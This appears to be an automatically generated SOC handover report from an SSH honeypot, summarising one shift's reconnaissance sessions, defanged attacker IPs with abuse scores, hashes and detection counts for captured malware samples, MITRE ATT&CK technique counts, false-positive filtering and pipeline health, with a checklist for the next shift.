## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `188.164.197[.]218` | **15** | 2026-05-24 11:22 | 2026-05-24 11:47 | 7m | 0 | `T1592` | 🟠 MEDIUM |
| `38.226.44[.]2` | **13** | 2026-05-24 11:46 | 2026-05-24 12:00 | 26m | 0 | `T1592` | 🟠 MEDIUM |
| `61.155.106[.]101` | **5** | 2026-05-24 12:31 | 2026-05-24 12:42 | 9m | 0 | `T1592` | 🟢 LOW |
| `181.209.113[.]114` | **2** | 2026-05-24 12:01 | 2026-05-24 12:05 | 4m | 0 | `T1592` | 🟢 LOW |
| `59.36.75[.]227` | **2** | 2026-05-24 13:40 | 2026-05-24 13:42 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `100.53.194[.]34` | 1 | 2026-05-24 12:56 | 2026-05-24 12:56 | 1s | 0 | `T1592` | 🟢 LOW |
| `103.84.236[.]222` | 1 | 2026-05-24 11:56 | 2026-05-24 11:56 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.75[.]127` | 1 | 2026-05-24 12:28 | 2026-05-24 12:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.51.12[.]53` | 1 | 2026-05-24 11:51 | 2026-05-24 11:51 | 13s | 0 | `T1592` | 🟢 LOW |
| `142.171.230[.]122` | 1 | 2026-05-24 12:31 | 2026-05-24 12:31 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `187.62.87[.]27` | 1 | 2026-05-24 12:37 | 2026-05-24 12:37 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.148.120[.]187` | 1 | 2026-05-24 13:22 | 2026-05-24 13:23 | 52s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `120.51.12[.]53` | JP | ARTERIA Networks Corporation | **100** ⚠️ | 0 |
| `181.209.113[.]114` | AR | Ilda Marcela Corvalan | **100** ⚠️ | 1 |
| `120.48.75[.]127` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 12 |
| `188.164.197[.]218` | ES | AXARNET COMUNICACIONES, S.L. | **100** ⚠️ | 4 |
| `38.226.44[.]2` | ID | PT CYB Media Group | **100** ⚠️ | 0 |
| `100.53.194[.]34` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 30 |
| `61.155.106[.]101` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `142.171.230[.]122` | US | MULTACOM CORPORATION | **100** ⚠️ | 3 |
| `122.177.242[.]16` | IN | BHARTI AIRTEL LTD B-38/C-1 SECTOR 57 NOIDA UP 201301 | **100** ⚠️ | 1 |
| `103.84.236[.]222` | IN | Blue Sky Broadband Pvt. Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 22 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 8 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 5 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 4 |

---

## 🔕 False Positive Summary (23 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 12 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 75 cases |
| Tool 34  | Credential Extractor        | ✅ 12 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 22 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 23 filtered (30.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 8 priority case(s) shown individually · 12 recon entry/entries in table (5 group(s) consolidating 37 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-24T13:43:32Z_
